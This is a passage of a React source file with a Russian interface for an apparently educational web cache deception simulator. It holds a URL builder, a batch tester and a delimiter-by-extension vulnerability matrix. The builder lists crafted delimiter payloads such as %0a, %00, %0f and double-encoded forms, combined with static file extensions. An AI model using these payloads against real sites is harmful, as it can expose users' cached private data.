                         variant.severity === 'low' ? '◦ Низкий' : '✓ Безоп.'}
                      </Badge>
                    </div>
                    <p className="text-[10px] sm:text-xs text-muted-foreground leading-snug line-clamp-2">
                      {variant.description}
                    </p>
                  </button>
                )
              })}
            </div>
          </div>

          {/* URL Builder */}
          <Card className="border-cyan-500/20">
            <CardHeader className="p-3 sm:p-4 pb-2">
              <div className="flex items-center gap-2">
                <Target className="h-4 w-4 text-cyan-400" />
                <CardTitle className="text-sm sm:text-base font-semibold">Конструктор URL</CardTitle>
              </div>
            </CardHeader>
            <CardContent className="px-3 sm:px-4 pb-3 sm:pb-4 space-y-3">
              <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
                {/* Route select */}
                <div>
                  <label className="text-[10px] sm:text-xs font-medium text-muted-foreground mb-1.5 block">Маршрут</label>
                  <select
                    value={builderRoute}
                    onChange={(e) => setBuilderRoute(e.target.value)}
                    className="w-full h-9 sm:h-10 rounded-md border border-border bg-background px-3 text-xs sm:text-sm font-mono focus:outline-none focus:ring-2 focus:ring-cyan-500/30"
                  >
                    <option value="/account/home">/account/home</option>
                    <option value="/api/user">/api/user</option>
                    <option value="/profile">/profile</option>
                    <option value="/dashboard">/dashboard</option>
                    <option value="/settings">/settings</option>
                  </select>
                </div>
                {/* Delimiter select */}
                <div>
                  <label className="text-[10px] sm:text-xs font-medium text-muted-foreground mb-1.5 block">Разделитель</label>
                  <select
                    value={builderDelimiter}
                    onChange={(e) => setBuilderDelimiter(e.target.value)}
                    className="w-full h-9 sm:h-10 rounded-md border border-border bg-background px-3 text-xs sm:text-sm font-mono focus:outline-none focus:ring-2 focus:ring-cyan-500/30"
                  >
                    <option value="">Без разделителя</option>
                    <option value="%0f">%0f (Shift In)</option>
                    <option value="%0a">%0a (LF)</option>
                    <option value="%0d">%0d (CR)</option>
                    <option value="%00">%00 (Null)</option>
                    <option value=";">; (Semicolon)</option>
                    <option value="%1f">%1f (Unit Sep)</option>
                    <option value="%0b">%0b (VTab)</option>
                    <option value="%0c">%0c (Form Feed)</option>
                    <option value="%09">%09 (Tab)</option>
                    <option value="%23">%23 (#)</option>
                    <option value="%3F">%3F (?)</option>
                    <option value="%250f">%250f (2× %0f)</option>
                    <option value="%2500">%2500 (2× %00)</option>
                    <option value="%250a">%250a (2× %0a)</option>
                  </select>
                </div>
                {/* Extension select */}
                <div>
                  <label className="text-[10px] sm:text-xs font-medium text-muted-foreground mb-1.5 block">Расширение</label>
                  <select
                    value={builderExtension}
                    onChange={(e) => setBuilderExtension(e.target.value)}
                    className="w-full h-9 sm:h-10 rounded-md border border-border bg-background px-3 text-xs sm:text-sm font-mono focus:outline-none focus:ring-2 focus:ring-cyan-500/30"
                  >
                    <option value="">Без расширения</option>
                    <option value="css">.css</option>
                    <option value="js">.js</option>
                    <option value="png">.png</option>
                    <option value="jpg">.jpg</option>
                    <option value="gif">.gif</option>
                    <option value="svg">.svg</option>
                    <option value="ico">.ico</option>
                    <option value="woff">.woff</option>
                    <option value="woff2">.woff2</option>
                    <option value="ttf">.ttf</option>
                    <option value="mp4">.mp4</option>
                    <option value="webm">.webm</option>
                  </select>
                </div>
              </div>
              {/* URL preview */}
              <div className="p-2.5 sm:p-3 rounded-lg bg-muted/50 border border-border">
                <p className="text-[10px] sm:text-xs text-muted-foreground mb-1">Предпросмотр URL:</p>
                <code className="text-xs sm:text-sm font-mono text-cyan-400 break-all">{buildCustomUrl()}</code>
              </div>
              <Button
                onClick={() => {
                  const url = buildCustomUrl()
                  setUrlInput(url)
                  setSandboxUrl(url)
                  setActiveTab('simulation')
                }}
                className="w-full bg-gradient-to-r from-cyan-500 to-emerald-500 hover:from-cyan-600 hover:to-emerald-600 text-white text-xs sm:text-sm"
              >
                <Play className="h-3.5 w-3.5 sm:h-4 sm:w-4 mr-1 sm:mr-2" />
                Запустить в симуляции
              </Button>
            </CardContent>
          </Card>

          {/* Batch test */}
          <Card className="border-amber-500/20">
            <CardHeader className="p-3 sm:p-4 pb-2">
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <Zap className="h-4 w-4 text-amber-400" />
                  <CardTitle className="text-sm sm:text-base font-semibold">Пакетное тестирование</CardTitle>
                </div>
                <Button
                  onClick={runBatchTest}
                  disabled={isBatchRunning}
                  size="sm"
                  className="bg-gradient-to-r from-amber-500 to-orange-500 hover:from-amber-600 hover:to-orange-600 text-white text-xs sm:text-sm"
                >
                  <Zap className="h-3.5 w-3.5 mr-1" />
                  {isBatchRunning ? 'Тестирование...' : 'Протестировать все варианты'}
                </Button>
              </div>
            </CardHeader>
            <CardContent className="px-3 sm:px-4 pb-3 sm:pb-4">
              {isBatchRunning && (
                <div className="mb-3">
                  <div className="h-2 rounded-full bg-muted overflow-hidden">
                    <div
                      className="h-full bg-gradient-to-r from-amber-500 to-orange-500 transition-all duration-200 rounded-full"
                      style={{ width: `${batchResults ? Object.keys(batchResults).length / filteredVariants.length * 100 : 0}%` }}
                    />
                  </div>
                  <p className="text-[10px] sm:text-xs text-muted-foreground mt-1">
                    Проверено: {batchResults ? Object.keys(batchResults).length : 0} / {filteredVariants.length}
                  </p>
                </div>
              )}
              {batchResults && (
                <div className="max-h-64 overflow-y-auto" style={{ scrollbarWidth: 'thin' }}>
                  <div className="space-y-1">
                    {filteredVariants.map((variant) => {
                      const isVuln = batchResults[variant.url]
                      return (
                        <div
                          key={variant.url}
                          className={`flex items-center gap-2 p-1.5 sm:p-2 rounded text-[10px] sm:text-xs ${
                            isVuln ? 'bg-red-500/5 border border-red-500/10' : 'bg-emerald-500/5 border border-emerald-500/10'
                          }`}
                        >
                          {isVuln ? (
                            <XCircle className="h-3.5 w-3.5 text-red-400 shrink-0" />
                          ) : (
                            <CheckCircle2 className="h-3.5 w-3.5 text-emerald-400 shrink-0" />
                          )}
                          <code className="font-mono text-muted-foreground flex-1 truncate">{variant.url}</code>
                          <Badge className={`text-[9px] sm:text-[10px] px-1.5 py-0 h-4 sm:h-5 border-0 ${
                            isVuln ? 'bg-red-500/10 text-red-400' : 'bg-emerald-500/10 text-emerald-400'
                          }`}>
                            {isVuln ? 'Уязвим' : 'Безопасен'}
                          </Badge>
                        </div>
                      )
                    })}
                  </div>
                  <div className="mt-3 p-2.5 rounded-lg bg-muted/50 border border-border">
                    <p className="text-[10px] sm:text-xs text-muted-foreground">
                      Итого: {Object.values(batchResults).filter(Boolean).length} уязвимых из{' '}
                      {Object.keys(batchResults).length} проверенных для {proxyConfig.type} + {backendConfig.type}
                    </p>
                  </div>
                </div>
              )}
              {!batchResults && !isBatchRunning && (
                <p className="text-[10px] sm:text-xs text-muted-foreground text-center py-4">
                  Нажмите «Протестировать все варианты» для проверки всех URL текущей категории
                </p>
              )}
            </CardContent>
          </Card>

          {/* Vulnerability Matrix */}
          <Card className="border-border">
            <CardHeader className="p-3 sm:p-4 pb-2">
              <div className="flex items-center gap-2">
                <LayoutGrid className="h-4 w-4 text-emerald-400" />
                <CardTitle className="text-sm sm:text-base font-semibold">Матрица уязвимостей</CardTitle>
              </div>
              <p className="text-[10px] sm:text-xs text-muted-foreground mt-1">
                Разделители × Расширения для маршрута /account/home ({proxyConfig.type} + {backendConfig.type})
              </p>
            </CardHeader>
            <CardContent className="px-3 sm:px-4 pb-3 sm:pb-4">
              <div className="overflow-x-auto -mx-3 sm:mx-0">
                <table className="w-full text-[10px] sm:text-xs border-collapse min-w-[480px]">
                  <thead>
                    <tr>
                      <th className="p-1.5 sm:p-2 text-left text-muted-foreground font-medium border border-border bg-muted/30 sticky left-0 z-10 bg-background">
                        Разделитель
                      </th>
                      {vulnerabilityMatrix.extensions.map(ext => (
                        <th key={ext} className="p-1.5 sm:p-2 text-center text-muted-foreground font-medium border border-border bg-muted/30">
                          .{ext}
                        </th>
                      ))}
                    </tr>
                  </thead>
                  <tbody>
                    {vulnerabilityMatrix.delimiters.map(delim => (
                      <tr key={delim}>
                        <td className="p-1.5 sm:p-2 font-mono text-muted-foreground border border-border bg-muted/20 sticky left-0 z-10 bg-background whitespace-nowrap">
                          {delim}
                        </td>
                        {vulnerabilityMatrix.extensions.map(ext => {
                          const isVuln = vulnerabilityMatrix.data[delim]?.[ext]
                          const isCached = proxyConfig.cacheStaticExts.includes(ext)
                          return (
                            <td
                              key={`${delim}-${ext}`}
                              className={`p-1.5 sm:p-2 text-center border border-border ${
                                isVuln
                                  ? 'bg-red-500/20 text-red-400 font-semibold'
                                  : isCached
                                    ? 'bg-emerald-500/10 text-emerald-400'
                                    : 'bg-muted/30 text-muted-foreground/40'
                              }`}
                              title={isVuln ? `Уязвим: ${delim}.${ext}` : isCached ? 'Безопасен' : 'Не кэшируется'}
                            >
                              {isVuln ? '✗' : isCached ? '✓' : '—'}
                            </td>
                          )
                        })}
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
              <div className="mt-3 flex flex-wrap gap-3 text-[10px] sm:text-xs text-muted-foreground">
                <span className="flex items-center gap-1">
                  <span className="inline-block w-3 h-3 rounded bg-red-500/20 border border-red-500/30" /> ✗ Уязвим
                </span>
                <span className="flex items-center gap-1">
                  <span className="inline-block w-3 h-3 rounded bg-emerald-500/10 border border-emerald-500/30" /> ✓ Безопасен
                </span>
                <span className="flex items-center gap-1">
                  <span className="inline-block w-3 h-3 rounded bg-muted/30 border border-border" /> — Не кэшируется
                </span>
              </div>
            </CardContent>
          </Card>
        </TabsContent>
      </Tabs>
    </div>
  )
}
